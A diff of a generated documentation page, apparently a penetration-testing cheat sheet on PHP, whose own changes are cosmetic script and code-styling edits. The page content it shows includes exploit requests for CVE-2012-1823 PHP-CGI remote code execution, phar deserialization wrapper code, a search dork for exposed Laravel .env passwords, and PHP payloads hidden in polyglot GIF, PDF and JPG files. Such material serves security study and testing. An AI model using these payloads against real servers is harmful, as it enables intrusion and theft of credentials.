@@ -19,9 +19,7 @@
     var mkdocs_page_input_path = "php.md";
     var mkdocs_page_url = "/php/";
   </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
+   
 </head>
 
 <body class="ready sticky">
@@ -311,7 +309,7 @@
               <h1 id="php">PHP</h1>
 <h2 id="command-execution">Command execution</h2>
 <p>Here is a list of functions to execute commands on a system:</p>
-<pre><code class="language-none line-numbers">exec
+<pre><code class="language-none">exec
 passthru
 shell_exec
 system
@@ -328,7 +326,7 @@ curl_multi_exec
 file operation such as <code>file_exists</code> might be less protected, then it's possible
 to inject a <code>phar</code> wrapper within it.</p>
 <p>The following code describes how to create a <code>phar</code> wrapper:</p>
-<pre><code class="language-php line-numbers">&lt;?php
+<pre><code class="language-php">&lt;?php
 
 require('weak_class.php');
 # We craft an object by overwriting some methods and functions
@@ -340,7 +338,7 @@ file_put_contents(&quot;/tmp/exploit.phar&quot;, serialize($obj));
 </code></pre>
 
 <p>Here is an example of exploitable functions:</p>
-<pre><code class="language-none line-numbers">copy
+<pre><code class="language-none">copy
 file_exists
 file_get_contents
 file_put_contents
@@ -375,11 +373,11 @@ unlink
 <h2 id="cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</h2>
 <p>PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.</p>
 <p>You can show the page source code:</p>
-<pre><code class="language-none line-numbers">GET https://&lt;host&gt;/file.php?-s
+<pre><code class="language-none">GET https://&lt;host&gt;/file.php?-s
 </code></pre>
 
 <p>Or even execute PHP scripts (or a remote code execution)</p>
-<pre><code class="language-none line-numbers">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+<pre><code class="language-none">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
 
 &lt;?php system('whoami'); ?&gt;
 </code></pre>
@@ -388,11 +386,11 @@ unlink
 <h2 id="laravel-configuration-file">Laravel configuration file</h2>
 <p>The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
 file at the root level of the web server:</p>
-<pre><code class="language-none line-numbers">https://&lt;host&gt;/.env
+<pre><code class="language-none">https://&lt;host&gt;/.env
 </code></pre>
 
 <p>You can find vulnerable target using a Google dork:</p>
-<pre><code class="language-none line-numbers">&quot;DB_PASSWORD&quot; filetype:env
+<pre><code class="language-none">&quot;DB_PASSWORD&quot; filetype:env
 </code></pre>
 
 <h2 id="php-session-files">PHP session files</h2>
@@ -425,7 +423,7 @@ file that contains a PHP payload.</p>
 <h3 id="gif89">GIF89</h3>
 <p><a href="../assets/polyglot.php.gif">This file</a>) contains a PHP payload in the <a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt" target="_blank">Comment
 Extension</a> of a 1 pixel GIF:</p>
-<pre><code class="language-bash line-numbers">hexdump -C assets/polyglot.php.gif
+<pre><code class="language-bash">hexdump -C assets/polyglot.php.gif
 00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
 00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.&lt;?php|
 00000020  69 6e 66 6f 28 29 3b                              |info();|
@@ -433,14 +431,14 @@ Extension</a> of a 1 pixel GIF:</p>
 
 <h3 id="pdf">PDF</h3>
 <p>You can add a comment (<code>%</code>) on the PDF header:</p>
-<pre><code class="language-pdf line-numbers">%PDF-1.2 %&lt;?phpinfo()?&gt;
+<pre><code class="language-pdf">%PDF-1.2 %&lt;?phpinfo()?&gt;
 ...
 </code></pre>
 
 <h3 id="others-formats">Others formats</h3>
 <p>On most formats (mp3, jpg, ...) there is an <code>EOF</code> after what we can add the
 payload. So the easiest way is to append to a valid file our payload:</p>
-<pre><code class="language-bash line-numbers">cat valid.jpg payload.php &gt; polyglot.php.jpg
+<pre><code class="language-bash">cat valid.jpg payload.php &gt; polyglot.php.jpg
 </code></pre>
             
           </div>
@@ -468,18 +466,8 @@ payload. So the easiest way is to append to a valid file our payload:</p>
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js"></script>
-    <script src="../js/prism-core.min.js"></script>
-    <script src="../js/prism-line-numbers.min.js"></script>
-    <script src="../js/prism-clike.min.js"></script>
-    <script src="../js/prism-yaml.min.js"></script>
-    <script src="../js/prism-powershell.min.js"></script>
-    <script src="../js/prism-bash.min.js"></script>
-    <script src="../js/prism-nginx.min.js"></script>
-    <script src="../js/prism-python.min.js"></script>
-    <script src="../js/prism-markup.min.js"></script>
-    <script src="../js/prism-markup-templating.min.js"></script>
-    <script src="../js/prism-php.min.js"></script>
+    <script async src="../js/theme.js"></script>
+    <script async src="../js/prism.min.js"></script>
     <script src="../search/main.js"></script>
     
     <script>
